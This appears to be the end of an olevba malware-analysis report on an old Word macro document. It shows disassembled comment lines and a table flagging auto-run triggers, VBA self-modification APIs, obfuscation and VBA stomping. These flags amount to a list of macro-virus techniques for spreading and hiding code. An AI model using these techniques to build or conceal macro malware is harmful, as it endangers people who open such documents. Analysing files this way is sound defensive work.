' 	QuoteRem 0x0000 0x0000 ""
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' 	QuoteRem 0x0000 0x0021 " 11:44:55  - пятница, 12 окт 2001"
' Line #256:
' 	QuoteRem 0x0000 0x0005 " Name"
' Line #257:
' 	QuoteRem 0x0000 0x0000 ""
' Line #258:
' Line #259:
' Line #260:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

